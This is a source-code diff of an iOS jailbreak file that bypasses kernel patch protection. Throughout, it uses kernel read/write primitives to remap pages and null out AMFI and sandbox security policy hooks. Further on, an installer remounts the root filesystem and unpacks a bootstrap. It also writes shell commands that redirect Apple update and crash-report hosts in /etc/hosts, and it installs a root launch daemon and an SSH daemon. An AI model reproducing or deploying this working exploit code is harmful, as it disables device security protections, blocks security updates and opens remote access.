@@ -8,376 +8,33 @@
 //
 
 #include "unjail.h"
-#include "extra_offsets.h"
 #include "offsets.h"
-#include "libjb.h"
+#include "jailbreak.h"
 
 // @qwertyoruiop's KPP bypass
-
-kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
-kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);
-kern_return_t mach_vm_protect(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, boolean_t set_maximum, vm_prot_t new_protection);
-kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);
-
-struct mac_policy_ops{
-    uint64_t mpo_audit_check_postselect;
-    uint64_t mpo_audit_check_preselect;
-    uint64_t mpo_bpfdesc_label_associate;
-    uint64_t mpo_bpfdesc_label_destroy;
-    uint64_t mpo_bpfdesc_label_init;
-    uint64_t mpo_bpfdesc_check_receive;
-    uint64_t mpo_cred_check_label_update_execve;
-    uint64_t mpo_cred_check_label_update;
-    uint64_t mpo_cred_check_visible;
-    uint64_t mpo_cred_label_associate_fork;
-    uint64_t mpo_cred_label_associate_kernel;
-    uint64_t mpo_cred_label_associate;
-    uint64_t mpo_cred_label_associate_user;
-    uint64_t mpo_cred_label_destroy;
-    uint64_t mpo_cred_label_externalize_audit;
-    uint64_t mpo_cred_label_externalize;
-    uint64_t mpo_cred_label_init;
-    uint64_t mpo_cred_label_internalize;
-    uint64_t mpo_cred_label_update_execve;
-    uint64_t mpo_cred_label_update;
-    uint64_t mpo_devfs_label_associate_device;
-    uint64_t mpo_devfs_label_associate_directory;
-    uint64_t mpo_devfs_label_copy;
-    uint64_t mpo_devfs_label_destroy;
-    uint64_t mpo_devfs_label_init;
-    uint64_t mpo_devfs_label_update;
-    uint64_t mpo_file_check_change_offset;
-    uint64_t mpo_file_check_create;
-    uint64_t mpo_file_check_dup;
-    uint64_t mpo_file_check_fcntl;
-    uint64_t mpo_file_check_get_offset;
-    uint64_t mpo_file_check_get;
-    uint64_t mpo_file_check_inherit;
-    uint64_t mpo_file_check_ioctl;
-    uint64_t mpo_file_check_lock;
-    uint64_t mpo_file_check_mmap_downgrade;
-    uint64_t mpo_file_check_mmap;
-    uint64_t mpo_file_check_receive;
-    uint64_t mpo_file_check_set;
-    uint64_t mpo_file_label_init;
-    uint64_t mpo_file_label_destroy;
-    uint64_t mpo_file_label_associate;
-    uint64_t mpo_ifnet_check_label_update;
-    uint64_t mpo_ifnet_check_transmit;
-    uint64_t mpo_ifnet_label_associate;
-    uint64_t mpo_ifnet_label_copy;
-    uint64_t mpo_ifnet_label_destroy;
-    uint64_t mpo_ifnet_label_externalize;
-    uint64_t mpo_ifnet_label_init;
-    uint64_t mpo_ifnet_label_internalize;
-    uint64_t mpo_ifnet_label_update;
-    uint64_t mpo_ifnet_label_recycle;
-    uint64_t mpo_inpcb_check_deliver;
-    uint64_t mpo_inpcb_label_associate;
-    uint64_t mpo_inpcb_label_destroy;
-    uint64_t mpo_inpcb_label_init;
-    uint64_t mpo_inpcb_label_recycle;
-    uint64_t mpo_inpcb_label_update;
-    uint64_t mpo_iokit_check_device;
-    uint64_t mpo_ipq_label_associate;
-    uint64_t mpo_ipq_label_compare;
-    uint64_t mpo_ipq_label_destroy;
-    uint64_t mpo_ipq_label_init;
-    uint64_t mpo_ipq_label_update;
-    uint64_t mpo_file_check_library_validation;
-    uint64_t mpo_vnode_notify_setacl;
-    uint64_t mpo_vnode_notify_setattrlist;
-    uint64_t mpo_vnode_notify_setextattr;
-    uint64_t mpo_vnode_notify_setflags;
-    uint64_t mpo_vnode_notify_setmode;
-    uint64_t mpo_vnode_notify_setowner;
-    uint64_t mpo_vnode_notify_setutimes;
-    uint64_t mpo_vnode_notify_truncate;
-    uint64_t mpo_mbuf_label_associate_bpfdesc;
-    uint64_t mpo_mbuf_label_associate_ifnet;
-    uint64_t mpo_mbuf_label_associate_inpcb;
-    uint64_t mpo_mbuf_label_associate_ipq;
-    uint64_t mpo_mbuf_label_associate_linklayer;
-    uint64_t mpo_mbuf_label_associate_multicast_encap;
-    uint64_t mpo_mbuf_label_associate_netlayer;
-    uint64_t mpo_mbuf_label_associate_socket;
-    uint64_t mpo_mbuf_label_copy;
-    uint64_t mpo_mbuf_label_destroy;
-    uint64_t mpo_mbuf_label_init;
-    uint64_t mpo_mount_check_fsctl;
-    uint64_t mpo_mount_check_getattr;
-    uint64_t mpo_mount_check_label_update;
-    uint64_t mpo_mount_check_mount;
-    uint64_t mpo_mount_check_remount;
-    uint64_t mpo_mount_check_setattr;
-    uint64_t mpo_mount_check_stat;
-    uint64_t mpo_mount_check_umount;
-    uint64_t mpo_mount_label_associate;
-    uint64_t mpo_mount_label_destroy;
-    uint64_t mpo_mount_label_externalize;
-    uint64_t mpo_mount_label_init;
-    uint64_t mpo_mount_label_internalize;
-    uint64_t mpo_netinet_fragment;
-    uint64_t mpo_netinet_icmp_reply;
-    uint64_t mpo_netinet_tcp_reply;
-    uint64_t mpo_pipe_check_ioctl;
-    uint64_t mpo_pipe_check_kqfilter;
-    uint64_t mpo_pipe_check_label_update;
-    uint64_t mpo_pipe_check_read;
-    uint64_t mpo_pipe_check_select;
-    uint64_t mpo_pipe_check_stat;
-    uint64_t mpo_pipe_check_write;
-    uint64_t mpo_pipe_label_associate;
-    uint64_t mpo_pipe_label_copy;
-    uint64_t mpo_pipe_label_destroy;
-    uint64_t mpo_pipe_label_externalize;
-    uint64_t mpo_pipe_label_init;
-    uint64_t mpo_pipe_label_internalize;
-    uint64_t mpo_pipe_label_update;
-    uint64_t mpo_policy_destroy;
-    uint64_t mpo_policy_init;
-    uint64_t mpo_policy_initbsd;
-    uint64_t mpo_policy_syscall;
-    uint64_t mpo_system_check_sysctlbyname;
-    uint64_t mpo_proc_check_inherit_ipc_ports;
-    uint64_t mpo_vnode_check_rename;
-    uint64_t mpo_kext_check_query;
-    uint64_t mpo_iokit_check_nvram_get;
-    uint64_t mpo_iokit_check_nvram_set;
-    uint64_t mpo_iokit_check_nvram_delete;
-    uint64_t mpo_proc_check_expose_task;
-    uint64_t mpo_proc_check_set_host_special_port;
-    uint64_t mpo_proc_check_set_host_exception_port;
-    uint64_t mpo_exc_action_check_exception_send;
-    uint64_t mpo_exc_action_label_associate;
-    uint64_t mpo_exc_action_label_copy;
-    uint64_t mpo_exc_action_label_destroy;
-    uint64_t mpo_exc_action_label_init;
-    uint64_t mpo_exc_action_label_update;
-    uint64_t mpo_reserved1;
-    uint64_t mpo_reserved2;
-    uint64_t mpo_reserved3;
-    uint64_t mpo_reserved4;
-    uint64_t mpo_reserved5;
-    uint64_t mpo_reserved6;
-    uint64_t mpo_posixsem_check_create;
-    uint64_t mpo_posixsem_check_open;
-    uint64_t mpo_posixsem_check_post;
-    uint64_t mpo_posixsem_check_unlink;
-    uint64_t mpo_posixsem_check_wait;
-    uint64_t mpo_posixsem_label_associate;
-    uint64_t mpo_posixsem_label_destroy;
-    uint64_t mpo_posixsem_label_init;
-    uint64_t mpo_posixshm_check_create;
-    uint64_t mpo_posixshm_check_mmap;
-    uint64_t mpo_posixshm_check_open;
-    uint64_t mpo_posixshm_check_stat;
-    uint64_t mpo_posixshm_check_truncate;
-    uint64_t mpo_posixshm_check_unlink;
-    uint64_t mpo_posixshm_label_associate;
-    uint64_t mpo_posixshm_label_destroy;
-    uint64_t mpo_posixshm_label_init;
-    uint64_t mpo_proc_check_debug;
-    uint64_t mpo_proc_check_fork;
-    uint64_t mpo_proc_check_get_task_name;
-    uint64_t mpo_proc_check_get_task;
-    uint64_t mpo_proc_check_getaudit;
-    uint64_t mpo_proc_check_getauid;
-    uint64_t mpo_proc_check_getlcid;
-    uint64_t mpo_proc_check_mprotect;
-    uint64_t mpo_proc_check_sched;
-    uint64_t mpo_proc_check_setaudit;
-    uint64_t mpo_proc_check_setauid;
-    uint64_t mpo_proc_check_setlcid;
-    uint64_t mpo_proc_check_signal;
-    uint64_t mpo_proc_check_wait;
-    uint64_t mpo_proc_label_destroy;
-    uint64_t mpo_proc_label_init;
-    uint64_t mpo_socket_check_accept;
-    uint64_t mpo_socket_check_accepted;
-    uint64_t mpo_socket_check_bind;
-    uint64_t mpo_socket_check_connect;
-    uint64_t mpo_socket_check_create;
-    uint64_t mpo_socket_check_deliver;
-    uint64_t mpo_socket_check_kqfilter;
-    uint64_t mpo_socket_check_label_update;
-    uint64_t mpo_socket_check_listen;
-    uint64_t mpo_socket_check_receive;
-    uint64_t mpo_socket_check_received;
-    uint64_t mpo_socket_check_select;
-    uint64_t mpo_socket_check_send;
-    uint64_t mpo_socket_check_stat;
-    uint64_t mpo_socket_check_setsockopt;
-    uint64_t mpo_socket_check_getsockopt;
-    uint64_t mpo_socket_label_associate_accept;
-    uint64_t mpo_socket_label_associate;
-    uint64_t mpo_socket_label_copy;
-    uint64_t mpo_socket_label_destroy;
-    uint64_t mpo_socket_label_externalize;
-    uint64_t mpo_socket_label_init;
-    uint64_t mpo_socket_label_internalize;
-    uint64_t mpo_socket_label_update;
-    uint64_t mpo_socketpeer_label_associate_mbuf;
-    uint64_t mpo_socketpeer_label_associate_socket;
-    uint64_t mpo_socketpeer_label_destroy;
-    uint64_t mpo_socketpeer_label_externalize;
-    uint64_t mpo_socketpeer_label_init;
-    uint64_t mpo_system_check_acct;
-    uint64_t mpo_system_check_audit;
-    uint64_t mpo_system_check_auditctl;
-    uint64_t mpo_system_check_auditon;
-    uint64_t mpo_system_check_host_priv;
-    uint64_t mpo_system_check_nfsd;
-    uint64_t mpo_system_check_reboot;
-    uint64_t mpo_system_check_settime;
-    uint64_t mpo_system_check_swapoff;
-    uint64_t mpo_system_check_swapon;
-    uint64_t mpo_reserved7;
-    uint64_t mpo_sysvmsg_label_associate;
-    uint64_t mpo_sysvmsg_label_destroy;
-    uint64_t mpo_sysvmsg_label_init;
-    uint64_t mpo_sysvmsg_label_recycle;
-    uint64_t mpo_sysvmsq_check_enqueue;
-    uint64_t mpo_sysvmsq_check_msgrcv;
-    uint64_t mpo_sysvmsq_check_msgrmid;
-    uint64_t mpo_sysvmsq_check_msqctl;
-    uint64_t mpo_sysvmsq_check_msqget;
-    uint64_t mpo_sysvmsq_check_msqrcv;
-    uint64_t mpo_sysvmsq_check_msqsnd;
-    uint64_t mpo_sysvmsq_label_associate;
-    uint64_t mpo_sysvmsq_label_destroy;
-    uint64_t mpo_sysvmsq_label_init;
-    uint64_t mpo_sysvmsq_label_recycle;
-    uint64_t mpo_sysvsem_check_semctl;
-    uint64_t mpo_sysvsem_check_semget;
-    uint64_t mpo_sysvsem_check_semop;
-    uint64_t mpo_sysvsem_label_associate;
-    uint64_t mpo_sysvsem_label_destroy;
-    uint64_t mpo_sysvsem_label_init;
-    uint64_t mpo_sysvsem_label_recycle;
-    uint64_t mpo_sysvshm_check_shmat;
-    uint64_t mpo_sysvshm_check_shmctl;
-    uint64_t mpo_sysvshm_check_shmdt;
-    uint64_t mpo_sysvshm_check_shmget;
-    uint64_t mpo_sysvshm_label_associate;
-    uint64_t mpo_sysvshm_label_destroy;
-    uint64_t mpo_sysvshm_label_init;
-    uint64_t mpo_sysvshm_label_recycle;
-    uint64_t mpo_reserved8;
-    uint64_t mpo_reserved9;
-    uint64_t mpo_vnode_check_getattr;
-    uint64_t mpo_mount_check_snapshot_create;
-    uint64_t mpo_mount_check_snapshot_delete;
-    uint64_t mpo_vnode_check_clone;
-    uint64_t mpo_proc_check_get_cs_info;
-    uint64_t mpo_proc_check_set_cs_info;
-    uint64_t mpo_iokit_check_hid_control;
-    uint64_t mpo_vnode_check_access;
-    uint64_t mpo_vnode_check_chdir;
-    uint64_t mpo_vnode_check_chroot;
-    uint64_t mpo_vnode_check_create;
-    uint64_t mpo_vnode_check_deleteextattr;
-    uint64_t mpo_vnode_check_exchangedata;
-    uint64_t mpo_vnode_check_exec;
-    uint64_t mpo_vnode_check_getattrlist;
-    uint64_t mpo_vnode_check_getextattr;
-    uint64_t mpo_vnode_check_ioctl;
-    uint64_t mpo_vnode_check_kqfilter;
-    uint64_t mpo_vnode_check_label_update;
-    uint64_t mpo_vnode_check_link;
-    uint64_t mpo_vnode_check_listextattr;
-    uint64_t mpo_vnode_check_lookup;
-    uint64_t mpo_vnode_check_open;
-    uint64_t mpo_vnode_check_read;
-    uint64_t mpo_vnode_check_readdir;
-    uint64_t mpo_vnode_check_readlink;
-    uint64_t mpo_vnode_check_rename_from;
-    uint64_t mpo_vnode_check_rename_to;
-    uint64_t mpo_vnode_check_revoke;
-    uint64_t mpo_vnode_check_select;
-    uint64_t mpo_vnode_check_setattrlist;
-    uint64_t mpo_vnode_check_setextattr;
-    uint64_t mpo_vnode_check_setflags;
-    uint64_t mpo_vnode_check_setmode;
-    uint64_t mpo_vnode_check_setowner;
-    uint64_t mpo_vnode_check_setutimes;
-    uint64_t mpo_vnode_check_stat;
-    uint64_t mpo_vnode_check_truncate;
-    uint64_t mpo_vnode_check_unlink;
-    uint64_t mpo_vnode_check_write;
-    uint64_t mpo_vnode_label_associate_devfs;
-    uint64_t mpo_vnode_label_associate_extattr;
-    uint64_t mpo_vnode_label_associate_file;
-    uint64_t mpo_vnode_label_associate_pipe;
-    uint64_t mpo_vnode_label_associate_posixsem;
-    uint64_t mpo_vnode_label_associate_posixshm;
-    uint64_t mpo_vnode_label_associate_singlelabel;
-    uint64_t mpo_vnode_label_associate_socket;
-    uint64_t mpo_vnode_label_copy;
-    uint64_t mpo_vnode_label_destroy;
-    uint64_t mpo_vnode_label_externalize_audit;
-    uint64_t mpo_vnode_label_externalize;
-    uint64_t mpo_vnode_label_init;
-    uint64_t mpo_vnode_label_internalize;
-    uint64_t mpo_vnode_label_recycle;
-    uint64_t mpo_vnode_label_store;
-    uint64_t mpo_vnode_label_update_extattr;
-    uint64_t mpo_vnode_label_update;
-    uint64_t mpo_vnode_notify_create;
-    uint64_t mpo_vnode_check_signature;
-    uint64_t mpo_vnode_check_uipc_bind;
-    uint64_t mpo_vnode_check_uipc_connect;
-    uint64_t mpo_proc_check_run_cs_invalid;
-    uint64_t mpo_proc_check_suspend_resume;
-    uint64_t mpo_thread_userret;
-    uint64_t mpo_iokit_check_set_properties;
-    uint64_t mpo_system_check_chud;
-    uint64_t mpo_vnode_check_searchfs;
-    uint64_t mpo_priv_check;
-    uint64_t mpo_priv_grant;
-    uint64_t mpo_proc_check_map_anon;
-    uint64_t mpo_vnode_check_fsgetpath;
-    uint64_t mpo_iokit_check_open;
-    uint64_t mpo_proc_check_ledger;
-    uint64_t mpo_vnode_notify_rename;
-    uint64_t mpo_vnode_check_setacl;
-    uint64_t mpo_vnode_notify_deleteextattr;
-    uint64_t mpo_system_check_kas_info;
-    uint64_t mpo_proc_check_cpumon;
-    uint64_t mpo_vnode_notify_open;
-    uint64_t mpo_system_check_info;
-    uint64_t mpo_pty_notify_grant;
-    uint64_t mpo_pty_notify_close;
-    uint64_t mpo_vnode_find_sigs;
-    uint64_t mpo_kext_check_load;
-    uint64_t mpo_kext_check_unload;
-    uint64_t mpo_proc_check_proc_info;
-    uint64_t mpo_vnode_notify_link;
-    uint64_t mpo_iokit_check_filter_properties;
-    uint64_t mpo_iokit_check_get_property;
-};
-
-#define ReadAnywhere32 kread_uint32
-#define WriteAnywhere32 kwrite_uint32
-#define ReadAnywhere64 kread_uint64
-#define WriteAnywhere64 kwrite_uint64
-
-#define copyin(to, from, size) kread(from, to, size)
-#define copyout(to, from, size) kwrite(to, from, size)
 
 #import "pte_stuff.h"
 
 #include "patchfinder64.h"
 
-static void
-kpp(int nukesb, int uref, uint64_t kernbase, uint64_t slide)
-{
+kern_return_t kpp(int nukesb, int uref, uint64_t kernbase, uint64_t slide){
+    
+    kern_return_t ret = KERN_SUCCESS;
+
     checkvad();
     
     uint64_t entryp;
     
     int rv = init_kernel(kernbase, NULL);
-    assert(rv == 0);
+    
+
+    if(rv != 0) {
+        printf("[ERROR]: could not initialize kernel\n");
+        ret = KERN_FAILURE;
+        goto cleanup;
+    }
+    
+    printf("[INFO]: sucessfully initialized kernel\n");
     
     uint64_t gStoreBase = find_gPhysBase();
     
@@ -393,17 +50,14 @@ kpp(int nukesb, int uref, uint64_t kernbase, uint64_t slide)
     if (uref) {
         optr = ReadAnywhere64(optr) - gPhysBase + gVirtBase;
     }
-    NSLog(@"%llx", optr);
+    printf("[INFO]: %llx\n", optr);
     
     uint64_t cpu_list = ReadAnywhere64(cpul - 0x10 /*the add 0x10, 0x10 instruction confuses findregval*/) - gPhysBase + gVirtBase;
     uint64_t cpu = ReadAnywhere64(cpu_list);
     
     uint64_t pmap_store = find_kernel_pmap();
-    NSLog(@"pmap: %llx", pmap_store);
+    printf("[INFO]: pmap: %llx\n", pmap_store);
     level1_table = ReadAnywhere64(ReadAnywhere64(pmap_store));
-    
-    
-    
     
     uint64_t shellcode = physalloc(0x4000);
     
@@ -433,9 +87,7 @@ kpp(int nukesb, int uref, uint64_t kernbase, uint64_t slide)
     
     uint64_t physcode = findphys_real(shellcode);
     
-    
-    
-    NSLog(@"got phys at %llx for virt %llx", physcode, shellcode);
+    printf("[INFO]: got phys at %llx for virt %llx\n", physcode, shellcode);
     
     uint64_t idlesleep_handler = 0;
     
@@ -447,8 +99,9 @@ kpp(int nukesb, int uref, uint64_t kernbase, uint64_t slide)
     while (cpu) {
         cpu = cpu - gPhysBase + gVirtBase;
         if ((ReadAnywhere64(cpu+0x130) & 0x3FFF) == 0x100) {
-            NSLog(@"already jailbroken, bailing out");
-            return;
+            printf("[ERROR]: already jailbroken, bailing out\n");
+            ret = KERN_ABORTED;
+            goto cleanup;
         }
         
         
@@ -479,8 +132,8 @@ kpp(int nukesb, int uref, uint64_t kernbase, uint64_t slide)
             
         }
         
-        NSLog(@"found cpu %x", ReadAnywhere32(cpu+0x330));
-        NSLog(@"found physz: %llx", ReadAnywhere64(cpu+0x130) - gPhysBase + gVirtBase);
+        printf("[INFO]: found cpu %x\n", ReadAnywhere32(cpu+0x330));
+        printf("[INFO]: found physz: %llx\n", ReadAnywhere64(cpu+0x130) - gPhysBase + gVirtBase);
         
         plist[z++] = cpu+0x130;
         cpu_list += 0x10;
@@ -493,7 +146,7 @@ kpp(int nukesb, int uref, uint64_t kernbase, uint64_t slide)
     uint64_t regi = find_register_value(idlesleep_handler+12, 30);
     uint64_t regd = find_register_value(idlesleep_handler+24, 30);
     
-    NSLog(@"%llx - %llx", regi, regd);
+    printf("[INFO]: %llx - %llx\n", regi, regd);
     
     for (int i = 0; i < 0x500/4; i++) {
         WriteAnywhere32(shc+i*4, 0xd503201f);
@@ -507,7 +160,7 @@ kpp(int nukesb, int uref, uint64_t kernbase, uint64_t slide)
     
     uint64_t ttbr0_real = find_register_value(idlesleep_handler + idx*4 + 24, 1);
     
-    NSLog(@"ttbr0: %llx %llx",ReadAnywhere64(ttbr0_real), ttbr0_real);
+    printf("[INFO]: ttbr0: %llx %llx\n",ReadAnywhere64(ttbr0_real), ttbr0_real);
     
     char* bbuf = malloc(0x4000);
     copyin(bbuf, ReadAnywhere64(ttbr0_real) - gPhysBase + gVirtBase, isvad == 0 ? 0x4000 : 0x1000);
@@ -559,7 +212,7 @@ kpp(int nukesb, int uref, uint64_t kernbase, uint64_t slide)
     
     mach_vm_protect(tfp0, shc, 0x4000, 0, VM_PROT_READ|VM_PROT_EXECUTE);
     
-    vm_address_t kppsh = 0;
+    mach_vm_address_t kppsh = 0;
     mach_vm_allocate(tfp0, &kppsh, 0x4000, VM_FLAGS_ANYWHERE);
     {
         int n = 0;
@@ -603,7 +256,7 @@ kpp(int nukesb, int uref, uint64_t kernbase, uint64_t slide)
 pagestuff_64((address) & (~PMK), ^(vm_address_t tte_addr, int addr) {\
 uint64_t tte = ReadAnywhere64(tte_addr);\
 if (!(TTE_GET(tte, TTE_IS_TABLE_MASK))) {\
-NSLog(@"breakup!");\
+printf("[INFO]: breakup!\n");\
 uint64_t fakep = physalloc(PSZ);\
 uint64_t realp = TTE_GET(tte, TTE_PHYS_VALUE_MASK);\
 TTE_SETB(tte, TTE_IS_TABLE_MASK);\
@@ -672,7 +325,7 @@ remappage[remapcnt++] = (x & (~PMK));\
     
     RemapPage(release);
     if (NewPointer(release) == (NewPointer(release+11) - 11)) {
-        copyout(NewPointer(release), "MarijuanARM", 11); /* marijuanarm */
+        copyout(NewPointer(release), "SaigonARM", 11); /* saigonarm */
     }
     
     
@@ -682,7 +335,7 @@ remappage[remapcnt++] = (x & (~PMK));\
     
     {
         uint64_t sysbootnonce = find_sysbootnonce();
-        NSLog(@"%x", ReadAnywhere32(sysbootnonce));
+        printf("[INFO]: nonce: %x\n", ReadAnywhere32(sysbootnonce));
                     
         WriteAnywhere32(sysbootnonce, 1);
     }
@@ -696,29 +349,24 @@ remappage[remapcnt++] = (x & (~PMK));\
     WriteAnywhere64(NewPointer(memcmp_got), ret1);
     
     uint64_t fref = find_reference(idlesleep_handler+0xC, 1, SearchInCore);
-    NSLog(@"fref at %llx", fref);
+    printf("[INFO]: fref at %llx\n", fref);
     
     uint64_t amfiops = find_amfiops();
     
-    NSLog(@"amfistr at %llx", amfiops);
-    
+    printf("[INFO]: amfistr at %llx\n", amfiops);
     
     {
-        /*
-         amfi
-         */
-        
+        /* amfi */
         uint64_t sbops = amfiops;
         uint64_t sbops_end = sbops + sizeof(struct mac_policy_ops);
-        
+            
         uint64_t nopag = sbops_end - sbops;
-        
-        for (int i = 0; i < nopag; i+= PSZ) {
+            
+        for (int i = 0; i < nopag; i+= PSZ)
             RemapPage(((sbops + i) & (~PMK)));
-        }
+
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap)), 0);
     }
-    
     
     /*
      first str
@@ -753,8 +401,7 @@ remappage[remapcnt++] = (x & (~PMK));\
         }
         fref += 4;
     }
-    
-    if (nukesb) {
+
         /*
          sandbox
          */
@@ -799,7 +446,7 @@ remappage[remapcnt++] = (x & (~PMK));\
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattr)), 0);
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_stat)), 0);
         
-    }
+
     
     {
         uint64_t point = find_amfiret()-0x18;
@@ -823,16 +470,22 @@ remappage[remapcnt++] = (x & (~PMK));\
         sleep(1);
     }
     
-    NSLog(@"enabled patches");
-    
+    printf("[INFO]: enabled patches\n");
+
+cleanup:
+    return ret;
 }
 
-int
-go_extra_recipe(void)
-{
+
+kern_return_t go_extra_recipe() {
+
+    kern_return_t ret = KERN_SUCCESS;
     int rv;
-    
-    kpp(0, 0, OFFSET(main_kernel_base), kaslr_shift);
+
+
+    uint64_t kaslr_shift = OFFSET(main_kernel_base) - OFFSET(kernel_text);
+    ret = kpp(1, 0, OFFSET(main_kernel_base), kaslr_shift);
+
     
     struct utsname uts;
     uname(&uts);
@@ -842,7 +495,7 @@ go_extra_recipe(void)
         off = 0xd0;
     }
 
-    uint64_t _rootvnode = mp ? (constget(5) + kaslr_shift) : (find_gPhysBase() + 0x38);
+    uint64_t _rootvnode = find_gPhysBase() + 0x38;
     uint64_t rootfs_vnode = kread_uint64(_rootvnode);
     uint64_t v_mount = kread_uint64(rootfs_vnode + off);
     uint32_t v_flag = kread_uint32(v_mount + 0x71);
@@ -851,84 +504,144 @@ go_extra_recipe(void)
     
     char *nmz = strdup("/dev/disk0s1s1");
     rv = mount("hfs", "/", MNT_UPDATE, (void *)&nmz);
-    NSLog(@"remounting: %d", rv);
+    
+    if(rv == -1) {
+        printf("[ERROR]: could not mount '/': %d\n", rv);
+    } else {
+        printf("[INFO]: successfully mounted '/'\n");
+    }
+
 
     v_mount = kread_uint64(rootfs_vnode + off);
     kwrite_uint32(v_mount + 0x71, v_flag);
-    
 
-    {
-        char path[4096];
-        uint32_t size = sizeof(path);
-        _NSGetExecutablePath(path, &size);
-        char *pt = realpath(path, NULL);
-
-        pid_t pd = 0;
-        NSString *execpath = [[NSString stringWithUTF8String:pt] stringByDeletingLastPathComponent];
-
-        NSString *tar = [execpath stringByAppendingPathComponent:@"tar"];
-        NSString *bootstrap = [execpath stringByAppendingPathComponent:@"bootstrap.tar"];
-        NSString *launchctl = [execpath stringByAppendingPathComponent:@"launchctl"];
-        const char *jl;
-
-        chdir("/tmp/");
-
-        jl = "/tmp/tar";
-        copyfile([tar UTF8String], jl, 0, COPYFILE_ALL);
-        chmod(jl, 0755);
-        posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, "--preserve-permissions", "--no-overwrite-dir", "-xvf", [bootstrap UTF8String], NULL }, NULL);
-        NSLog(@"pid = %x", pd);
-        waitpid(pd, NULL, 0);
-
-        jl = "/tmp/bin/launchctl";
-        copyfile([launchctl UTF8String], jl, 0, COPYFILE_ALL);
-        chmod(jl, 0755);
-        posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, "load", "/tmp/Library/LaunchDaemons", NULL }, NULL);
-        NSLog(@"pid = %x", pd);
-        waitpid(pd, NULL, 0);
-    }
-
-    return 1;
+    return ret;
 }
 
-// TODO: Actually finish this
-kern_return_t go_kppless() {
+
+kern_return_t install_cydia (int force_reinstall) {
     
-    kern_return_t ret = KERN_FAILURE;
-    uint64_t kernel_base = OFFSET(main_kernel_base);
-    uint64_t allproc = 0xf; // TODO
-    uint64_t credpatch = 0xf; // TODO
+    kern_return_t ret = KERN_SUCCESS;
     
-    int rv;
     
-    if (mp) {
-        hibit_guess = 0xFFFFFFE000000000;
+    char path[256];
+    uint32_t size = sizeof(path);
+    _NSGetExecutablePath(path, &size);
+    char* pt = realpath(path, 0);
+    
+    
+    {
+        __block pid_t pd = 0;
+        NSString* execpath = [[NSString stringWithUTF8String:pt]  stringByDeletingLastPathComponent];
+
+        if (force_reinstall == 0) {
+        
+            NSString* tar = [execpath stringByAppendingPathComponent:@"tar"];
+            NSString* bootstrap = [execpath stringByAppendingPathComponent:@"bootstrap.tar"];
+            const char* jl = [tar UTF8String];
+            
+            unlink("/bin/tar");
+            unlink("/bin/launchctl");
+            
+            
+            copyfile(jl, "/bin/tar", 0, COPYFILE_ALL);
+            chmod("/bin/tar", 0777);
+            jl="/bin/tar"; //
+            
+            chdir("/");
+            
+            posix_spawn(&pd, jl, 0, 0, (char**)&(const char*[]){jl, "--preserve-permissions", "--no-overwrite-dir", "-xvf", [bootstrap UTF8String], NULL}, NULL);
+            NSLog(@"pid = %x", pd);
+            waitpid(pd, 0, 0);
+            
+            
+            NSString* jlaunchctl = [execpath stringByAppendingPathComponent:@"launchctl"];
+            jl = [jlaunchctl UTF8String];
+            
+            copyfile(jl, "/bin/launchctl", 0, COPYFILE_ALL);
+            chmod("/bin/launchctl", 0755);
+
+            posix_spawn(&pd, "/bin/bash", 0, 0, (char**)&(const char*[]){"/bin/bash", "-c", """echo '127.0.0.1 iphonesubmissions.apple.com' >> /etc/hosts""", NULL}, NULL);
+            posix_spawn(&pd, "/bin/bash", 0, 0, (char**)&(const char*[]){"/bin/bash", "-c", """echo '127.0.0.1 radarsubmissions.apple.com' >> /etc/hosts""", NULL}, NULL);
+            posix_spawn(&pd, "/bin/bash", 0, 0, (char**)&(const char*[]){"/bin/bash", "-c", """echo '127.0.0.1 mesu.apple.com' >> /etc/hosts""", NULL}, NULL);
+            posix_spawn(&pd, "/bin/bash", 0, 0, (char**)&(const char*[]){"/bin/bash", "-c", """echo '127.0.0.1 appldnld.apple.com' >> /etc/hosts""", NULL}, NULL);
+
+//            system("echo '127.0.0.1 iphonesubmissions.apple.com' >> /etc/hosts");
+//            system("echo '127.0.0.1 radarsubmissions.apple.com' >> /etc/hosts");
+//            
+//            system("/usr/bin/uicache");
+
+            posix_spawn(&pd, "/usr/bin/uicache", 0, 0, (char**)&(const char*[]){"/usr/bin/uicache", NULL}, NULL);
+            posix_spawn(&pd, "killall", 0, 0, (char**)&(const char*[]){"killall", "-SIGSTOP", "cfprefsd", NULL}, NULL);
+            
+            // Show hidden apps
+            NSMutableDictionary* md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
+            [md setObject:[NSNumber numberWithBool:YES] forKey:@"SBShowNonDefaultSystemApps"];
+            [md writeToFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist" atomically:YES];
+
+            posix_spawn(&pd, "killall", 0, 0, (char**)&(const char*[]){"killall", "-9", "cfprefsd", NULL}, NULL);
+
+            
+        }
+        {
+            NSString* jlaunchctl = [execpath stringByAppendingPathComponent:@"reload"];
+            unlink("/usr/libexec/reload");
+            copyfile([jlaunchctl UTF8String], "/usr/libexec/reload", 0, COPYFILE_ALL);
+            chmod("/usr/libexec/reload", 0755);
+            chown("/usr/libexec/reload", 0, 0);
+            
+        }
+        {
+            NSString* jlaunchctl = [execpath stringByAppendingPathComponent:@"0.reload.plist"];
+            unlink("/Library/LaunchDaemons/0.reload.plist");
+            copyfile([jlaunchctl UTF8String], "/Library/LaunchDaemons/0.reload.plist", 0, COPYFILE_ALL);
+            chmod("/Library/LaunchDaemons/0.reload.plist", 0644);
+            chown("/Library/LaunchDaemons/0.reload.plist", 0, 0);
+        }
+        {
+            NSString* jlaunchctl = [execpath stringByAppendingPathComponent:@"dropbear.plist"];
+            unlink("/Library/LaunchDaemons/dropbear.plist");
+            copyfile([jlaunchctl UTF8String], "/Library/LaunchDaemons/dropbear.plist", 0, COPYFILE_ALL);
+            chmod("/Library/LaunchDaemons/dropbear.plist", 0644);
+            chown("/Library/LaunchDaemons/dropbear.plist", 0, 0);
+        }
